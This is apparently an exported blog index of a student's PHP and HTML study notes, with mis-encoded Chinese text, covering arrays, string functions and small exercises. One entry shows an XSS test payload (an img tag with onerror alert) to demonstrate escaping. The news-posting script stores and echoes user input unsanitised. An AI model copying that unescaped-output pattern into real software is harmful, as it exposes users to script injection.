&lt;td&gt;$date&lt;/td&gt; &lt;td&gt;&lt;button&gt;ðŸ‘&lt;/button&gt;/&lt;button&gt;ðŸ‘Ž&lt;/button&gt;&lt;/td&gt; &lt;/tr&gt;EOF; if($top3Cnt&lt;=3)&#123; $tmpContent = mb_substr(base64_decode($data[2]), 0,50); echo &lt;&lt;&lt;EOF &lt;tr&gt; &lt;td&gt;&lt;img src=&quot;$imgUrl&quot; height=&quot;80&quot; width=&quot;80&quot;&gt;&lt;/td&gt; &lt;td colspan=&apos;4&apos;&gt;&lt;b&gt;å†…å®¹ç®€ä»‹ï¼š&lt;/b&gt;$tmpContent&lt;/td&gt; &lt;/tr&gt;EOF; &#125; $top3Cnt++; &#125; ?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt; OUT add_news.php 123456789101112131415161718192021222324252627282930313233343536373839&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;å¢žåŠ æ–°é—»&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;add_news.php&quot; method=&quot;post&quot;&gt; æ ‡å·ï¼š&lt;input type=&quot;number&quot; name=&quot;id&quot;&gt;&lt;br&gt; æ ‡é¢˜ï¼š&lt;input type=&quot;text&quot; name=&quot;title&quot;&gt;&lt;br&gt;&lt;!-- æ ‡é¢˜ï¼š&lt;input type=&quot;text&quot; namne=&quot;title&quot;&gt;&lt;br&gt;--&gt; å†…å®¹ï¼š&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;&lt;br&gt; æ—¥æœŸï¼š&lt;input type=&quot;date&quot; name=&quot;date&quot;&gt;&lt;br&gt; ä½œè€…ï¼š&lt;input type=&quot;author&quot; name=&quot;author&quot;&gt;&lt;br&gt; çƒ­åº¦ï¼š&lt;input type=&quot;number&quot; name=&quot;hot&quot;&gt;&lt;br&gt; å›¾ç‰‡ï¼š&lt;input type=&quot;url&quot; name=&quot;imgUrl&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;&lt;/form&gt;&lt;?php $fhandle = fopen(&apos;news.db &apos;, &apos;a&apos;); $arrMes = array(); @$arrMes[0] = $_POST[&apos;id&apos;]; @$arrMes[1] = base64_encode($_POST[&apos;title&apos;]); @$arrMes[2] = base64_encode($_POST[&apos;content&apos;]); @$arrMes[3] = $_POST[&apos;date&apos;]; @$arrMes[4] = base64_encode($_POST[&apos;author&apos;]); @$arrMes[5] = $_POST[&apos;hot&apos;]; @$arrMes[6]= $_POST[&apos;imgUrl&apos;]; if($arrMes[0]!=NULL) &#123; $writeMes = implode(&apos;||&apos;, $arrMes); echo $writeMes; $fline = fputs($fhandle, $writeMes); &#125; fclose($fhandle);?&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>å®žæˆ˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note17]]></title>
    <url>%2F2019%2F08%2F06%2Fnote17%2F</url>
    <content type="text"><![CDATA[Abstract: PHPè¯­è¨€ä¸­whileå’Œforçš„ç”¨æ³•ï¼Œä»¥åŠPHPæ•°ç»„çš„ç”¨æ³•ã€‚ 1. PHPä¸‰ç§å·¥ä½œæ¨¡å¼(æ–‡ä»¶åŽç¼€è§£æžæ—¶æœ‰ä½•åŒºåˆ«)1.1 moduleæ¨¡å¼LAMP â€” Linux Apache Php Mysql phpä½œä¸ºapacheæ¨¡å—è¿è¡Œï¼Œapacheé‡åˆ°ä¸€ä¸ªphpæ–‡ä»¶ï¼Œï¼Œå°±ç›¸å½“äºŽæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ php a.phpï¼Œæ–‡ä»¶åŽç¼€è§£æžä»¥apacheé…ç½®æ–‡ä»¶ä¸ºä¸»ï¼Œå¦‚æžœapacheè®¤ä¸º.xxxæ–‡ä»¶æ—¶phpè„šæœ¬ï¼Œå°±å½“ä½œphpæ‰§è¡Œã€‚ 1.2 CGIæ¨¡å¼LNMP â€” Linux Nginx Php Mysql phpä¼šç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œnginx/phpstorm/iisç­‰ä¸­é—´ä»¶é‡åˆ°ä¸€ä¸ªphpæ–‡ä»¶æ—¶ï¼Œä¼šæŠŠè¯·æ±‚è½¬å‘ç»™phpç›‘å¬çš„ç«¯å£ã€‚ æœ‰ä¸¤ä¸ªé…ç½®æ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯ä¸­é—´ä»¶ï¼Œä¸€ä¸ªæ˜¯phpæœåŠ¡çš„ï¼Œnginx/iisè®¤ä¸º.xxxåŽç¼€æ–‡ä»¶æ˜¯phpè„šæœ¬ï¼Œäº¤ç»™phpå¤„ç†ï¼Œä½†åœ¨phpé…ç½®æ–‡ä»¶ä¸­ï¼Œä¼šæœ‰ä¸€ä¸ªé™åˆ¶php5/php3/phtml/phpèƒ½å¤Ÿè¢«è¯†åˆ«ã€‚ ç¬¬ä¸‰å‘¨æ€»ç»“ æœ€åº•éƒ¨æœ‰ä¸‰ç§æ¨¡å¼çš„å¯¹æ¯”ã€‚ 2. PHPæ•°ç»„2.1 æ•°å€¼æ•°ç»„â€‹ è‡ªåŠ¨åˆ†é…IDé”®ï¼ˆIDé”®æ€»æ˜¯ä»Ž0å¼€å§‹ï¼‰ 123456&lt;?php $cars = array(&quot;Volvo&quot;, &quot;BMW&quot;, &quot;Toyota&quot;); echo $cars[0]; //è¾“å‡º&quot;Volvo&quot; echo $cars[1]; //è¾“å‡º&quot;BMW&quot; echo $cars[2]; //è¾“å‡º&quot;Toyota&quot;?&gt; â€‹ count()å‡½æ•°â€”èŽ·å–æ•°ç»„çš„é•¿åº¦ 1234&lt;?php $cars = array(&quot;Volvo&quot;, &quot;BMW&quot;, &quot;Toyota&quot;); echo count($cars);?&gt; â€‹ éåŽ†æ•°å€¼æ•°ç»„ 12345678&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); $arrlength=count($cars); for($x=0;$x&lt;$arrlength;$x++)&#123; echo $cars[$x]; echo &quot;&lt;br&gt;&quot;; &#125;?&gt; ä¸ºä¸€ä¸ªæ•°ç»„å¢žåŠ ä¸€ä½ï¼Œä¸é€‚åˆç”¨ä¸Šè¿°è¿™ç§æ–¹æ³•éåŽ†ã€‚ 12345678910111213141516171819&lt;?php $arr = array(&apos;name&apos;=&gt;&apos;zs&apos;, 2, &apos;age&apos;=&gt;18, 1); echo $arr[&apos;name&apos;]; //zs echo PHP_EOL; echo $arr[0]; //2 echo PHP_EOL; echo $arr[&apos;age&apos;]; //18 echo PHP_EOL; echo $arr[1]; //1 $arr1 = array(1,2,3,4,5); $arr1[0] = 6; echo PHP_EOL; $arr1[100] = 100; echo PHP_EOL; echo $arr1[0], $arr1[100]; for($i=0; $i&lt;=100; $i++)&#123; //610062345 æŠ¥é”™ï¼Œç›´åˆ°i=100æ—¶æŠŠ100è¾“å‡º echo $arr1[$i]; &#125;?&gt; ä½¿ç”¨foreachå°±ä¸ä¼šæŠ¥é”™ï¼Œæ•°å€¼æ•°ç»„å’Œå…³è”æ•°ç»„æ··åˆæ—¶ï¼Œå…³è”æ•°ç»„å¹¶ä¸å½±å“æ•°å€¼æ•°ç»„çš„ä¸‹æ ‡ã€‚ 2.2 å…³è”æ•°ç»„å…³è”æ•°ç»„å¯ä»¥æŒ‡å®šé”®çš„æ•°ç»„ 1234&lt;?php $age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;); echo &quot;Peter is &quot; . $age[&apos;Peter&apos;] . &quot; years old.&quot;;?&gt; éåŽ†å…³è”æ•°ç»„ 123456789&lt;?php $age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;); foreach($age as $x=&gt;$x_value) &#123; echo &quot;Key=&quot; . $x . &quot;, Value=&quot; . $x_value; echo &quot;&lt;br&gt;&quot;; &#125;?&gt; 1234567891011121314151617&lt;?php $arr = array(1, 2, 3, 4, 5); foreach($arr as $key =&gt; $value)&#123; echo $key.&quot;=&gt;&quot;.$value; echo PHP_EOL; &#125; $arr[5]=709; foreach($arr as $key =&gt; $value)&#123; echo $key.&quot;=&gt;&quot;.$value; echo PHP_EOL; &#125; $arr[100] = 100; foreach($arr as $key =&gt; $value)&#123; echo $key.&quot;=&gt;&quot;.$value; echo PHP_EOL; &#125; ?&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç»ƒä¹ 2]]></title>
    <url>%2F2019%2F08%2F06%2Fpractice2%2F</url>
    <content type="text"><![CDATA[Abstract: PHPè¯­è¨€if-else/switch-caseå’Œwhileç»ƒä¹  é¢˜ç›®ä¸€ï¼šè¾“å…¥å¹´æœˆæ—¥ï¼Œè®¡ç®—æ˜¯è¯¥å¹´çš„å¤šå°‘å¤©ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?php//form: year.month.day$date = fgets(STDIN);$Date = explode(&apos;.&apos;, $date);echo $Date;$year = $Date[0];$month = $Date[1];$day = $Date[2];echo &quot;&lt;br&gt;&quot;;echo $year;echo &quot;&lt;br&gt;&quot;;echo $month;echo &quot;&lt;br&gt;&quot;;echo $day;if(($year%4==0 &amp;&amp; $year%100!=0)||($year%400==0))&#123; $flag=1;&#125;else&#123; $flag=0;&#125;switch($month)&#123; case($month&lt;=2): $days = 31*($month-1)+$day; break; case(3&lt;=$month&amp;&amp;$month&lt;=8): if($flag==1)&#123; if($month%2==1) &#123; $days = 31 * (intval($month - 1) / 2) + 29 + 30 * (intval($month / 2) - 1) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + 29 + 30 * (intval($month/ 2)-2) + $day; &#125; &#125;else&#123; if($month%2==1) &#123; $days = 31 * (intval($month - 1) / 2) + 28 + 30 * (intval($month / 2) - 1) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + 28 + 30 * (intval(($month) / 2)-2) + $day; &#125; &#125; break; default: if($flag==1)&#123; if($month%2==1) &#123; $days = 31 * (intval($month + 1) / 2) + 29 + 30 * (intval($month / 2) - 2) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + 29 + 30 * (intval($month/ 2)-2) + $day; &#125; &#125;else&#123; if($month%2==1) &#123; $days = 31 * (intval($month + 1) / 2) + 28 + 30 * (intval($month / 2) - 2) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + 28 + 30 * (intval($month/ 2)-2) + $day; &#125; &#125; break;&#125;echo $days;?&gt; ä»£ç ç¼ºç‚¹ï¼šå¯ä»¥çœ‹å‡ºæ¥ä»£ç æœ‰äº›åœ°æ–¹é‡å¤ä½¿ç”¨ï¼Œæ²¡æœ‰è¾¾åˆ°ç®€æ´çš„ç›®çš„ï¼Œç‘žå¹´å’Œå¹³å¹´åœ¨äºŒæœˆç›¸å·®ä¸€å¤©ï¼Œå®Œå…¨å¯ä»¥é€šè¿‡flagè¿™ä¸ªæ ‡è¯†æ¥å¼¥è¡¥ã€‚æ”¹è¿›æ€è·¯ï¼šè®¾ç½®ä¸€ä¸ªFebDaysçš„å˜é‡ï¼ŒæŠŠå€¼è®¾ä¸º28ï¼Œåœ¨caseé‡Œé¢ä¸éœ€è¦å†æ¬¡åˆ¤æ–­ç‘žå¹´å¹³å¹´ï¼Œè®¡ç®—daysæ—¶ï¼ŒæŠŠflagåŠ ä¸Šï¼Œè¿™æ ·å°±å¯ä»¥æŠŠç‘žå¹³å¹´åˆ†å¼€ã€‚ æ”¹è¿›ç‰ˆï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php//year-month-day$date = fgets(STDIN);$Date = explode(&apos;.&apos;, $date);echo $Date;$year = $Date[0];$month = $Date[1];$day = $Date[2];echo &quot;&lt;br&gt;&quot;;echo $year;echo &quot;&lt;br&gt;&quot;;echo $month;echo &quot;&lt;br&gt;&quot;;echo $day;if(($year%4==0 &amp;&amp; $year%100!=0)||($year%400==0))&#123; $flag=1;&#125;else&#123; $flag=0;&#125;$FebDays = 28;switch($month)&#123; case($month&lt;=2): $days = 31*($month-1)+$day; break; case(3&lt;=$month&amp;&amp;$month&lt;=8): if($month%2==1) &#123; $days = 31 * (intval($month - 1) / 2) + $FebDays + $flag + 30 * (intval($month / 2) - 1) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + $FebDays + $flag + 30 * (intval($month/ 2)-2) + $day; &#125; break; default: if($month%2==1) &#123; $days = 31 * (intval($month + 1) / 2) + $FebDays + $flag + 30 * (intval($month / 2) - 2) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + $FebDays + $flag + 30 * (intval($month/ 2)-2) + $day; &#125; break;&#125;echo $days;?&gt; ä¸¤æ®µä»£ç å¯¹æ¯”å¯ä»¥å‘çŽ°ï¼Œè®¡ç®—å¤©æ•°çš„ä»£ç é‡è¾ƒå°‘çš„å°†è¿‘ä¸€åŠã€‚ é¢˜ç›®äºŒï¼šå¯ä»¥ä¸€ç›´è¾“å…¥å­¦ç”Ÿæˆç»©ï¼ŒçŸ¥é“è¾“å…¥q/exit/quité€€å‡ºç¨‹åº æ€è·¯ä¸€ï¼šåœ¨æ­»å¾ªçŽ¯é‡Œé¢æ‰§è¡Œä»£ç ï¼Œç¬¦åˆé€€å‡ºæ¡ä»¶æ—¶break 12345678910111213141516171819202122232425262728293031323334&lt;?phpwhile(1)&#123; echo &quot;Please Input Your Mes: &quot;; $inMes = fgets(STDIN); var_dump($inMes); if((trim($inMes)==&quot;q&quot;)||(trim($inMes)==&quot;quit&quot;)||(trim($inMes)==&quot;exit&quot;))&#123; break; &#125; else &#123; switch ($inMes) &#123; case(90 &lt;= $inMes &amp;&amp; $inMes &lt;= 100): echo &quot;Your Grade is A&quot;; break; case(80 &lt;= $inMes &amp;&amp; $inMes &lt; 90): echo &quot;YourGrade is B&quot;; break; case(70 &lt;= $inMes &amp;&amp; $inMes &lt; 80): echo &quot;Your Grade is C&quot;; break; case(60 &lt;= $inMes &amp;&amp; $inMes &lt; 70): echo &quot;YourGrade is D&quot;; break; case($inMes &lt; 60): echo &quot;YourGrade is E&quot;; break; default: break; &#125; echo PHP_EOL; &#125;&#125;?&gt; é—®é¢˜ä¸Žè§£å†³ï¼š * é€€å‡ºä¸æˆåŠŸï¼Œç”¨`var_dump($inMes)`æŸ¥çœ‹å‘çŽ°ï¼Œç³»ç»Ÿä¼šåœ¨è¾“å…¥å­—ç¬¦åŽåŠ `\n`,ç”¨`trim()`å‡½æ•°è§£å†³ * è¾“å…¥å…¶ä»–å­—ç¬¦ï¼Œphpä¼šæŠŠå­—ç¬¦è½¬æ¢æˆæ•°å­—ï¼Œç„¶åŽè¿›è¡Œæ¯”è¾ƒæ€è·¯äºŒï¼šæŠŠé€€å‡ºé€»è¾‘å†™åœ¨while()æ‹¬å·å†… 12345678910111213141516171819202122&lt;?php$Grade = fgets(STDIN);$sss = array(&quot;q&quot;,&quot;exit&quot;,&quot;quit&quot;);//å¦‚æžœ$Gradeä¸åœ¨$sssæ•°ç»„ä¸­å°±ç»§ç»­æ‰§è¡Œç¨‹åºwhile(!in_array(trim($Grade), $sss))&#123; switch($Grade)&#123; case $Grade&gt;=90 &amp;&amp; $Grade&lt;100; echo &quot;A&quot;; break; case $Grade&gt;=60 &amp;&amp; $Grade&lt;90; echo &quot;B&quot;; break; case $Grade&lt;60 &amp;&amp; $Grade&gt;=0; echo &quot;C&quot;; break; default: echo &apos;ERROR!&apos;; &#125; echo PHP_EOL; $Grade = fgets(STDIN);&#125;?&gt; é—®é¢˜ä¸Žè§£å†³ï¼š * åœ¨å¤„ç†`$Grade`ä¸Ž`$sss`æ—¶ï¼Œæƒ³å¦è¾Ÿè¹Šå¾„ï¼Œåœ¨æ•°ç»„`$sss`é‡Œé¢å­—ç¬¦åŽåŠ ä¸Š`\n`ä½†å§‹ç»ˆæ²¡æœ‰æˆåŠŸï¼Œæœ€ç»ˆè¿˜æ˜¯å¯¹`$Grade`è¿›è¡Œ`trim()`å¤„ç†ã€‚â€‹]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>å®žæˆ˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note16]]></title>
    <url>%2F2019%2F08%2F06%2Fnote16%2F</url>
    <content type="text"><![CDATA[Abstract: PHPä¸­çš„è¿ç®—ç¬¦ã€å­—ç¬¦ä¸²æ“ä½œå’Œæµç¨‹æŽ§åˆ¶ 1. PHPè¿ç®—ç¬¦å­—ç¬¦ä¸²å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒæ—¶ï¼ŒæŠŠå­—ç¬¦ä¸²è½¬æˆæ•°å­—ï¼Œç„¶åŽæ¯”è¾ƒã€‚ NULL False â€˜â€™ [] 0 å¸ƒå°”å€¼å‡ä¸ºFalse 2. PHPå¸¸ç”¨å‡½æ•° å‡½æ•°åç§° ä½œç”¨ addslashes($string) â€˜ â€œ ç©º \ å‰æ·»åŠ \ï¼Œè½¬ç§»ç‰¹æ®Šå­—ç¬¦ï¼Œé˜²å¾¡SQLæ³¨å…¥ bin2hex() è®¡ç®—ASCIIç  chr(ascii: 0x) ASCIIç è½¬æ¢æˆå­—ç¬¦ crypt(â€˜passwdâ€™ , salt) åŠ å¯†å‡½æ•° md5($str) hashè®¡ç®— explode(â€˜.â€™, $str) æ ¹æ®æä¾›çš„å­—ç¬¦ï¼Œæ¥åˆ‡å‰²å­—ç¬¦ä¸²ï¼Œç»“æžœæ˜¯ä¸€ä¸ªæ•°ç»„ htmlspecialchars($payload) â€˜ â€œ &lt; &gt; &amp; è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ä¸ºhtmlå®žä½“ç¼–ç ï¼Œé˜²å¾¡xss implode(â€˜.â€™, $str ) è¿”å›žä¸€ä¸ªç”±æ•°ç»„å…ƒç´ ç»„åˆæˆçš„å­—ç¬¦ä¸² str_ireplace(sear,rep, subj) æ›¿æ¢å­—ç¬¦ä¸² strchr(haystack, needle) æŸ¥æ‰¾å­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›žå­—ç¬¦ä¸²ä¹‹åŽçš„æ‰€æœ‰å†…å®¹ strcmp(str1, str2) æ¯”è¾ƒå­—ç¬¦ä¸²ï¼ŒåŒºåˆ†å¤§å°å†™ strlen($str) è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ substr(str, start, length) å­—ç¬¦ä¸²æˆªå–ï¼ŒæŒ‰â€œä½â€æˆªå– mb_substr(str, start, length) åŒä¸Šï¼ŒæŒ‰â€œå­—â€æˆªå– trim($str) åŽ»é™¤ä¸¤ä¾§ç©ºç™½å­—ç¬¦ PHP Stringå‡½æ•° addslashes()å‡½æ•°è¿”å›žåœ¨é¢„å®šä¹‰çš„å­—ç¬¦å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸² é¢„å®šä¹‰å­—ç¬¦æ˜¯ï¼š 1234* å•å¼•å·(&apos;)* åŒå¼•å·(&quot;)* åæ–œæ (\)* NULL 12345678910111213&lt;?php$str = addslashes(&quot;what does &quot;yolo&quot; mean?&quot;);echo $str;echo PHP_EOL;$str = addslashes(&quot;what does &apos;yolo&apos; mean?&quot;);echo $str;echo PHP_EOL;$str = addslashes(&quot;what does \yolo\ mean?&quot;);echo $str;echo PHP_EOL;$str = addslashes(&quot;what does \x00 mean?&quot;);echo $str;?&gt; OUT 123456/*what does \"yolo\" mean?what does \'yolo\' mean?what does \\yolo\\ mean?What does \0 mean?*/ bin2hex()æŠŠASCIIå€¼è¿”å›žå­—ç¬¦ï¼›chr()æŠŠæŒ‡å®šASCIIå€¼è¿”å›žå­—ç¬¦ã€‚ 12345678&lt;?phpecho bin2hex(&quot;\n&quot;);echo PHP_EOL;echo chr(0x61);echo PHP_EOL;$str = bin2hex(&quot;Hello World!&quot;);echo($str);?&gt; OUT 12345/*0aa48656c6c6f20576f726c6421*/ crypt(str, salt)è¿”å›žä½¿ç”¨DESã€Blowfishæˆ–MD5ç®—æ³•åŠ å¯†çš„å­—ç¬¦ä¸² md5()è®¡ç®—å­—ç¬¦ä¸²çš„MD5æ•£åˆ— 1234567&lt;?phpecho crypt('123456', 'rl');$str = 'hello';echo md5($str);?&gt; 1* explode(separator, string, limit)ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²å¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›žå­—ç¬¦ä¸²ç»„æˆçš„æ•°ç»„ 123456789101112131415&lt;?php$a = array();$url = &apos;https://www.baidu.com&apos;;$url = explode(&apos;.&apos;, $url);$host = $url[0];$name = $url[1];$or = $url[2];echo $host;echo PHP_EOL;echo $name;echo PHP_EOL;echo $or;echo PHP_EOL;echo ($a==0);?&gt; OUT 12345/*https://wwwbaiducom*/ 1* htmlentities()å‡½æ•°æŠŠå­—ç¬¦è½¬æ¢ä¸ºHTMLå®žä½“ 1234&lt;?php$str = &quot;&lt;Â© W3CSÃ§hÂ°Â°Â¦Â§&gt;&quot;;echo htmlentities($str);?&gt; OUT 123/*&amp;lt;&amp;copy; W3CS&amp;ccedil;h&amp;deg;&amp;deg;&amp;brvbar;&amp;sect;&amp;gt;*/ htmlspecialchars(string, flags, character-set, double_encode) å‡½æ•°æŠŠä¸€äº›é¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®žä½“ &amp; â€”&gt; $amp â€œ â€”&gt; &amp;quot â€˜ â€”&gt; â€˜ &lt; â€”&gt; &amp;lt &gt; â€”&gt; &amp;gt 12345678910111213&lt;?php$payload = &apos;&lt;img src=&quot;a&quot; onerror=&quot;alert(1)&quot;&gt;&apos;;echo htmlspecialchars($payload);$str = &quot;This is some &lt;b&gt;bold&lt;/b&gt; text.&quot;;echo htmlspecialchars($str);echo array()==null;echo PHP_EOL;$str = &quot;&lt;Â© W3CSÃ§hÂ°Â°Â¦Â§&gt;&quot;;echo htmlentities($str);?&gt; OUT 1234567/*&amp;lt;img src=&amp;quot;a&amp;quot; onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;This is some &amp;lt;b&amp;gt;bold&amp;lt;/b&amp;gt; text.1&amp;lt;&amp;copy; W3CS&amp;ccedil;h&amp;deg;&amp;deg;&amp;brvbar;&amp;sect;&amp;gt;*/ 1* import(separator, array)è¿”å›žä¸€ä¸ªç”±æ•°ç»„å…ƒç´ ç»„æˆå­—ç¬¦ä¸² 123456&lt;?php$arr = array(&apos;Hello&apos;,&apos;World!&apos;,&apos;Beautiful&apos;,&apos;Day!&apos;);echo implode(&quot; &quot;,$arr);?&gt; OUT 123/*Hello World! Beautiful Day!*/ 12* str_ireplace(find, replace, string, count)æ›¿æ¢å­—ç¬¦ä¸²ä¸­ä¸€äº›å­—ç¬¦(ä¸åŒºåˆ†å¤§å°å†™) * strchr(string, search,before_search)æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºçŽ° strcmp(sting1, string2)æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸² è¿”å›ž0 - å¦‚æžœä¸¤ä¸ªå­—ç¬¦ç›¸ç­‰ è¿”å›ž&lt;0 - string1&lt;string2 è¿”å›ž&gt;0 - string1&gt;string2 trim()ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ 1234567891011&lt;?phpecho str_ireplace(&quot;WORLD&quot;, &quot;Peter&quot;, &quot;Hello world!&quot;);echo PHP_EOL;echo strchr(&quot;Hello world!&quot;,&quot;world&quot;);echo PHP_EOL;echo strcmp(&quot;Hello world!&quot;,&quot;Hello world!&quot;);echo PHP_EOL;$str = &quot;Hello World!&quot;;echo $str . &quot;&lt;br&gt;&quot;;echo trim($str,&quot;Hed!&quot;);?&gt; OUT 123456/*Hello Peter!world!0Hello World!&lt;br&gt;llo Worl*/ substr(str, start, length)å‡½æ•°è¿”å›žå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼›æŒ‰â€ä½â€œæˆªå– mb_substr(str, start, length)å‡½æ•°è¿”å›žå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼ŒæŒ‰â€å­—â€œæˆªå– start æ­£æ•°â€”å­—ç¬¦ä¸²æŒ‡å®šä½ç½®å¼€å§‹ è´Ÿæ•°â€”ä»Žå­—ç¬¦ä¸²ç»“å°¾æŒ‡å®šä½ç½®å¼€å§‹ 0 â€”å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦å¤„å¼€å§‹ length æ­£æ•°â€”ä»Žstartå‚æ•°æ‰€åœ¨ä½ç½®è¿”å›ž è´Ÿæ•°â€”ä»Žå­—ç¬¦ä¸²æœ«ç«¯è¿”å›ž 1234&lt;?phpecho substr(&quot;Hello World !&quot;,0, 5); // å­—ç¬¦ä¸²æˆªå–ï¼ŒæŒ‰ç…§`ä½`æˆªå–echo mb_substr(&quot;abcä½ å¥½!èœé¸Ÿï¼&quot;,0, 4); // å­—ç¬¦ä¸²æˆªå–ï¼ŒæŒ‰ç…§`å­—`æˆªå–?&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[week3sum]]></title>
    <url>%2F2019%2F08%2F04%2Fweek3sum%2F</url>
    <content type="text"><![CDATA[Abstract: å¯¹ç¬¬ä¸‰å‘¨å­¦ä¹ å†…å®¹çš„æ€»ç»“ 1. HTML123456789101112131415161718&lt;!--&lt;!DOCTYPE html&gt;å£°æ˜Žä¸ºHTML5æ–‡æ¡£--&gt;&lt;!--HTMLè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€--&gt;&lt;!--HTMLæ–‡æ¡£ä¹Ÿå«åšwebé¡µé¢--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;HTML&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt; æ ‡é¢˜ &lt;/h1&gt; &lt;p&gt; æ®µè½ &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; æ–‡æœ¬åŸŸã€å¯†ç å­—æ®µå’Œæäº¤æŒ‰é’® 12345&lt;form name="input" action="htmlFormAction.php" method="get"&gt; Name: &lt;input type="text" name="name"&gt;&lt;br&gt; Password: &lt;input type="password" name="password"&gt; &lt;input type="submit"value="Submit"&gt; &lt;/form&gt; å•é€‰æŒ‰é’® 1234&lt;form&gt; &lt;input type="radio" name="sex" value="male"&gt;Male&lt;br&gt; &lt;input type="radio" name="sex" value="female"&gt;Female&lt;br&gt;&lt;/form&gt; å¤é€‰æ¡† 1234&lt;form&gt; &lt;input type="checkbox" name="vehicle" value="Bike"&gt; I have a bike&lt;br&gt; &lt;input type="checkbox" name="vehicle" value="Car"&gt;I have acar&lt;/form&gt; é™„ï¼šHTMLé€ŸæŸ¥åˆ—è¡¨ â€‹ HTMLå‚è€ƒæ‰‹å†Œ HTMLæµ‹éªŒ æµ‹è¯•ç½‘å€ï¼šHTMLæµ‹éªŒ äº§ç”Ÿç²—ä½“å­—çš„HTMLæ ‡ç­¾æ˜¯&lt;b&gt;ã€‚ ç”µå­é‚®ä»¶é“¾æŽ¥ï¼š&lt;a href=&quot;mailto:xxx@yyy&quot;&gt;ã€‚ äº§ç”Ÿä¸‹æ‹‰åˆ—è¡¨çš„æ˜¯&lt;select&gt;ã€‚ 12345678&lt;form action=""&gt; &lt;select name="cars"&gt; &lt;option value="volvo"&gt;Volvo&lt;/option&gt; &lt;option value="saab"&gt;Saab&lt;/option&gt; &lt;option value="fiat"&gt;Fiat&lt;/option&gt; &lt;option value="audi" selected&gt; Audi&lt;/option&gt; &lt;/select&gt;&lt;/form&gt; XMLå’ŒHTMLçš„åŒºåˆ«ï¼šHTMLä¸è¦æ±‚æ ‡è®°çš„åµŒå¥—ï¼Œé…å¯¹ç­‰ï¼Œä¸è¦æ±‚æ ‡è®°é—´å…·æœ‰ä¸€å®šçš„é¡ºåºï¼Œè€ŒXMLåˆ™æ˜¯ä¸¥æ ¼è¦æ±‚åµŒå¥—ï¼Œé…å¯¹ã€‚ DOMä»£è¡¨æ–‡æ¡£å¯¹è±¡æ¨¡åž‹ï¼ŒDTDæ˜¯æ–‡æ¡£ç±»åž‹å®šä¹‰ã€‚ divæ ‡ç­¾çš„ä½œç”¨æ˜¯ï¼šæŒ‰é€»è¾‘åˆ’åˆ†é¡µé¢æ–‡æ¡£ã€‚ metaæ ‡ç­¾ä½œç”¨ç”¨äºŽï¼šå­˜å‚¨ä¸Žæµè§ˆå™¨å’Œæœç´¢å¼•æ“Žç›¸å…³çš„ä¿¡æ¯ã€‚ å¯¹äºŽHTMLä¸­çš„æ¡†æž¶(Iframe/frameset)å¦‚ä½•æŒ‡å®šå±å¹•çš„å…¶ä½™éƒ¨åˆ†ï¼šä½¿ç”¨*ã€‚ å½“å‰æ–‡æ¡£å’Œé“¾æŽ¥æ–‡æ¡£ä¹‹é—´çš„å…³ç³»æ˜¯ä½¿ç”¨å±žæ€§relæŒ‡å®šçš„ã€‚ 